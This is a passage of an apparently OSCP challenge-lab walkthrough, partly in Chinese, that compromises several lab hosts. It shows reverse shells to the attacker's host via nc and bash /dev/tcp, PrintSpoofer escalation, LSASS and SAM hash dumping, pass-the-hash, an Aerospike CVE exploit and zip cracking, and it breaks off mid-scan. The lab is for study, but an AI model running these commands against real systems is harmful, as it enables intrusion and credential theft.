## Challenge 4 OSCP A

### [192.168.56.141(Eric.Wallows/EricLikesRunning800)]

<details>
<summary>$ nmap -sC -sV 192.168.56.141</summary>

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
81/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

</details>

```
$ evil-winrm -i 192.168.56.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
```
#### SeImpersonatePrivilege --> nc64.exe && PrintSpoofer64
[https://github.com/int0x33/nc.exe/tree/master]
[https://github.com/itm4n/PrintSpoofer/releases]

<details>
<summary>*Evil-WinRM* PS C:</summary>
  
```
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> iwr http://192.168.49.56:8011/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> iwr http://192.168.49.56:8011/nc64.exe -OutFile nc64.exe

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer64.exe -c "nc64.exe 192.168.49.56 4444 -e powershell"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

</details>

##### nt authority\system  --> 把 Eric.Wallows 加入 Administrators
<details>
<summary>PS C:\Users> net localgroup Administrators eric.wallows /add</summary>

```
$ nc -lvnp 4444               
                                                                                                 
PS C:\Windows\system32> whoami
nt authority\system

PS C:\Users> net localgroup //查看本机组,查看 MS01 这台机器上的本地组列表
net localgroup

Aliases for \\MS01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

PS C:\Users> net localgroup Administrators eric.wallows /add
net localgroup Administrators eric.wallows /add
The command completed successfully.
```
  
</details>

##### 调用 NetExec（nxc）的 lsassy 模块，作用是：通过 SMB 远程连接目标 Windows，并尝试从 LSASS 进程中提取内存里的凭据（尤其是 NTLM hash、Kerberos ticket）
```
$ nxc smb 192.168.56.141 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy

SMB         192.168.56.141  445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.56.141  445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
LSASSY      192.168.56.141  445    MS01             Saved 18 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
LSASSY      192.168.56.141  445    MS01             OSCP\celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd                                                                                            
LSASSY      192.168.56.141  445    MS01             MS01\Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e 
```
##### 内网渗透/横向移动 ligolo-ng
[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9]

<details>
<summary>proxy && agent.exe</summary>

```
$ tar -xvf ligolo-ng_proxy_0.9_linux_amd64.tar.gz
LICENSE
README.md
proxy

$ unzip ligolo-ng_agent_0.9_windows_amd64.zip
Archive:  ligolo-ng_agent_0.9_windows_amd64.zip
replace LICENSE? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: LICENSE                 
replace README.md? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: README.md               
  inflating: agent.exe

$ python3 -m http.server 8011
```

</details>

<details>
<summary>Agent connection</summary>

```
$ evil-winrm -i 192.168.55.141  -u 'Eric.Wallows' -p 'EricLikesRunning800'

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> iwr http://10.13.55.50:8011/agent.exe -OutFile agent.exe

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\agent.exe -connect 10.13.55.50:11601 -ignore-cert
```

</details>

<details>
<summary>Create tunnel</summary>

```
$ sudo ./proxy -selfcert
     
ligolo-ng » INFO[1420] Agent joined.                                 id=fa163ee7f47b name="OSCP\\eric.wallows@MS01" remote="192.168.55.141:62676"

ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.55.141:62676 - fa163ee7f47b

[Agent : OSCP\eric.wallows@MS01] » interface_create --name ligolo
INFO[2162] Creating a new ligolo interface...           
INFO[2162] Interface created!                           
[Agent : OSCP\eric.wallows@MS01] » start
INFO[2178] Starting tunnel to OSCP\eric.wallows@MS01 (fa163ee7f47b)
[Agent : OSCP\eric.wallows@MS01] » route_add --name ligolo --route 10.10.55.0/24
INFO[2335] Route created. 
```

</details>

### [10.10.14.142][10.10.14.140]

<details>
<summary>$ nmap -sC -sV 10.10.55.142</summary>

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

</details>

<details>
<summary>$ nmap -sT -A 10.10.14.140</summary>

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-19 03:45:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

</details>

```
LSASSY      192.168.56.141  445    MS01             OSCP\celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd                                                                                            
LSASSY      192.168.56.141  445    MS01             MS01\Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e
```

<details>
<summary>$ nxc winrm 10.10.14.140 10.10.14.142 -u users.txt  -H hashes.txt -t 100</summary>

```
[*] Copying default configuration file
WINRM       10.10.55.142    5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
WINRM       10.10.55.140    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam) 
WINRM       10.10.55.142    5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
```

</details>

##### download SAM && download SYSTEM

<details>
<summary>$ evil-winrm -i 10.10.14.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'</summary>

```
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM
                                        
Info: Downloading C:\windows.old\Windows\System32\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM
                                        
Info: Downloading C:\windows.old\Windows\System32\SYSTEM to SYSTEM
                                        
Info: Download successful!               
```

</details>

<details>
<summary>$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL</summary>

```
$ ls
Desktop    Downloads   Music     Public  SYSTEM     users.txt
Documents  hashes.txt  Pictures  SAM     Templates  Videos
                                                                                                
$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
```

</details>

```
$ nxc winrm 10.10.14.142 -u users_sam.txt -H hashes_sam.txt --continue-on-success -t 100
  
WINRM       10.10.14.142    5985   MS02             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
```
```
$ evil-winrm -i 10.10.14.142 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'   
                                        
*Evil-WinRM* PS C:\Users\tom_admin\Documents> dir
```
```
$ evil-winrm -i 10.10.14.140 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
```
### [192.168.54.143]

<details>
<summary>$ nmap -sC 192.168.54.143</summary>

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
81/tcp   open  hosts2-ns
443/tcp  open  https
3000/tcp open  ppp
3001/tcp open  nessus
3003/tcp open  cgms
3306/tcp open  mysql
5432/tcp open  postgresql
```

</details>

##### '3003 tcp open cgms exploit' --> [CVE-2020-13151]
[https://github.com/b4ny4n/CVE-2020-13151]

<details>
<summary>CVE-2020-13151 aerospike</summary>

```
$ git clone https://github.com/b4ny4n/CVE-2020-13151.git

$ python3 -m  venv venv
                                                                             
$ source venv/bin/activate
                                                                             
$ pip install aerospike

$ python cve2020-13151.py --ahost 192.168.64.143 --netcatshell --lhost 10.13.64.50 --lport=3000
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote fjWMUSYOeHfQPslN
[+] registering udf
[+] sending payload, make sure you have a listener on 10.13.64.50:3000.....
```
```
$ nc -lvnp 3000
Listening on 0.0.0.0 3000
Connection received on 192.168.64.143 53030
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/$

aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/$ ^Z
$ stty raw -echo;fg 
[1]  + continued  nc -lvnp 3000
                               export TERM=xterm
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/$
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/$ cd home
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/home$ cd aero
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/home/aero$ ls
local.txt  snap
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-201-014:/home/aero$ cat local.txt
```

</details>

##### 使用了 /usr/share/peass/linpeas/linpeas.sh --> 得到 /root/aerospike.sh 权限不够
```
aero@oscp:/etc$ scp kali@192.168.49.54:/usr/share/peass/linpeas/linpeas.sh /tmp/

aero@oscp:/etc$ bash /tmp/linpeas.sh

*/1 * * * * root /root/aerospike.sh

aero@oscp:/etc$ ls -ld /root
drwx------ 9 root root 4096 Jul 20 02:31 /root
```
##### 使用 /usr/share/pspy/pspy32s --> 得到 /opt/aerospike/bin/asadm
```
aero@oscp:/$ scp kali@192.168.49.56:/usr/share/pspy/pspy32s /tmp/

aero@oscp:/tmp$ ./pspy32s

2026/07/21 03:24:08 CMD: UID=0     PID=10560  | python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'                                                                                                        
2026/07/21 03:24:08 CMD: UID=0     PID=10561  | python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'
```
##### 使用反向 shell 有效载荷覆盖了 /opt/aerospike/bin/asadm
```
aero@oscp:/$ ls -al /opt/aerospike/bin/asadm
-rwxr-xr-x 1 aero aero 6723733 Dec  7  2019 /opt/aerospike/bin/asadm

aero@oscp:/$ echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.56/443 0>&1'" > /opt/aerospike/bin/asadm
```
```
$ sudo nc -lvnp 443
listening on [any] 443 ...

connect to [192.168.49.56] from (UNKNOWN) [192.168.56.143] 48536
bash: cannot set terminal process group (11779): Inappropriate ioctl for device
bash: no job control in this shell
root@oscp:~# 
root@oscp:~# whoami
whoami
root
root@oscp:~# cat /root/proof.txt
```
### [192.168.56.144]

<details>
<summary>$ nmap -sV -sC 192.168.56.144</summary>

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
| http-git: 
|   192.168.56.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://*@github.com/PWK-Challenge-Lab/dev.git
|_http-generator: Nicepage 4.21.12, nicepage.com
```

</details>

##### 使用wget导出Git仓库 好神奇
```
$ wget -r "http://192.168.56.144/.git/"

$ cd 192.168.56.144                    
$ ls
Home.css  Home.html  icons  images  index.html  jquery.js  nicepage.css  nicepage.js

$ cd .git
```

<details>
<summary>$ git log</summary>

```                             
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit eda55ed6455d29532295684e3900cda74d695067
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt

commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:08 2022 +0200

    Create search.php

commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:26:09 2022 +0200

    Setting up database.php

commit 58cfadc91978ec5db50a03c571493e3038d2935d
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:22:48 2022 +0200

    Create index.php

commit 5e212bcd0b8d5815af1c4fdfccd6a07c16e1330b
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:22:22 2022 +0200

    Create order.php

commit 0822a51f607bb05c0e6230acd74f27e7b6130934
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:21:50 2022 +0200

    Create export.php

commit 1c48db4a587970ee95208f3f408676505e343318
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:21:11 2022 +0200

    Initial commit
```

</details>

<details>
<summary>$ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54</summary>

```
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
```

</details>

##### stuart/BreakingBad92
```
$ ssh stuart@192.168.56.144
stuart@oscp:~$ whoami
stuart
stuart@oscp:~$ ls
local.txt
stuart@oscp:~$ cat local.txt
```
#### Privilege Escalation
```
stuart@oscp:/etc$ scp kali@192.168.49.56:/usr/share/peass/linpeas/linpeas.sh /tmp/
```

<details>
<summary>stuart@oscp:/tmp$ ./linpeas.sh</summary>

```
???????????? Backup folders
drwxr-xr-x 2 root root 4096 Nov 18  2022 /opt/backup                                                                         
total 84
-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 sitebackup1.zip
-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 sitebackup2.zip
-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 sitebackup3.zip

drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1405/var/backups
total 0

drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1695/var/backups
total 0

drwxr-xr-x 2 root root 4096 Jul 21 02:17 /var/backups
total 724
-rw-r--r-- 1 root root  51200 Jul 21 02:17 alternatives.tar.0
-rw-r--r-- 1 root root  36870 Nov 18  2022 apt.extended_states.0
-rw-r--r-- 1 root root      0 Jul 21 02:17 dpkg.arch.0
-rw-r--r-- 1 root root    268 Oct 31  2022 dpkg.diversions.0
-rw-r--r-- 1 root root    135 Nov 18  2022 dpkg.statoverride.0
-rw-r--r-- 1 root root 636365 Nov 18  2022 dpkg.status.0
```

</details>

```
stuart@oscp:/opt/backup$ ls -la
total 92
drwxr-xr-x 2 root   root    4096 Nov 18  2022 .
drwxr-xr-x 3 root   root    4096 Nov 18  2022 ..
-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 sitebackup1.zip
-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 sitebackup2.zip
-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 sitebackup3.zip
```

<details>
<summary>scp</summary>

```
stuart@oscp:/opt/backup$ scp sitebackup1.zip kali@192.168.49.56:~/oscp/
kali@192.168.49.56's password: 
sitebackup1.zip                                                         100%   26KB  15.2MB/s   00:00    
stuart@oscp:/opt/backup$ scp sitebackup2.zip kali@192.168.49.56:~/oscp/
kali@192.168.49.56's password: 
sitebackup2.zip                                                         100%   24KB  14.4MB/s   00:00    
stuart@oscp:/opt/backup$ scp sitebackup3.zip kali@192.168.49.56:~/oscp/
kali@192.168.49.56's password: 
sitebackup3.zip                                                         100%   25KB  15.0MB/s   00:00 
```

</details>

##### sitebackup3.zip 需要密码
```
$ 7z x sitebackup3.zip

$ zip2john sitebackup3.zip > sitebackup_hashes.hash

$ ls /usr/share/wordlists/rockyou.txt.gz 
/usr/share/wordlists/rockyou.txt.gz

$ cp /usr/share/wordlists/rockyou.txt.gz .
$ gunzip rockyou.txt.gz
```

<details>
<summary>$ john --wordlist=rockyou.txt sitebackup_hashes.hash</summary>

```
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:07 DONE (2026-07-21 04:18) 2.519g/s 5432p/s 103214c/s 103214C/s dyesebel..loserface1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

</details>

```
$ 7z x sitebackup3.zip

$ cd joomla

$ grep -r -i 'passw' *  
configuration.php:      public $password = 'Password@1';
```

<details>
<summary>$ cat configuration.php</summary>

```
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Challenge Lab';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysql';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'Password@1';
        public $db = 'jooml';
        public $dbprefix = 'o83rl_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'Ee24zIK4cDhJHL4H';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'chloe@challenge.lab';
        public $fromname = 'Challenge Lab';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
```

</details>

##### public $secret = 'Ee24zIK4cDhJHL4H';
##### public $mailfrom = 'chloe@challenge.lab';
```
stuart@oscp:~$ su chloe
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

chloe@oscp:/home/stuart$ whoami
chloe
chloe@oscp:/home/stuart$ sudo -l 
[sudo] password for chloe: 
Matching Defaults entries for chloe on oscp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
chloe@oscp:/home/stuart$ sudo su
root@oscp:/home/stuart# cd ~
root@oscp:~# cat /root/proof.txt
```
### [192.168.56.145]
```
$ ports=$(nmap -p- --min-rate=1000 -Pn -T4 192.168.74.145 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

<details>
<summary>[★]$ nmap -p$ports -Pn -sC -sV 192.168.74.145</summary>

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2026-07-21T15:22:58
|_Not valid after:  2027-01-20T15:22:58
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-22T15:31:16+00:00
|_ssl-date: 2026-07-22T15:31:56+00:00; +8h00m00s from scanner time.
5986/tcp open  ssl/wsmans?
|_ssl-date: 2026-07-22T15:31:56+00:00; +8h00m00s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-07-21T15:24:23
|_Not valid after:  2036-07-19T15:24:23
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.99%I=7%D=7/22%Time=6A60712D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
